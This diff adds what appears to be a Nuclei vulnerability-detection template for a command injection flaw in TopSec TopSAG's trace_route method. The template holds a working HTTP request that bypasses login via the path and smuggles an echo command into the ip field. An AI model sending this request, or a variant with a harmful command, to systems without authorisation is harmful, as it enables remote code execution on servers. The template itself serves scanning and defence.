@@ -1,0 +1,33 @@
+id: topsec-topsag-trace-route-rce
+info:
+  name: TopSec TopSAG trace_route RCE
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    TopSec TopSAG Security Audit System contains a command execution vulnerability in the trace_route method. An attacker can exploit this vulnerability to execute arbitrary commands on the server.
+  tags:
+    - command-execution
+  reference:
+    - https://www.topsec.com.cn/product/173.html
+  classification:
+    cve-id: []
+    cvss-score: 10.0
+variables:
+  rand_hex: "{{rand_text_alphanumeric(16)}}"
+http:
+  - raw:
+      - |
+        POST /iam/synRequest.do;.login.jsp HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        method=trace_route&w=1&ip=127.0.0.1|echo {{rand_hex}};&&m=10
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "{{rand_hex}}"
+        part: body
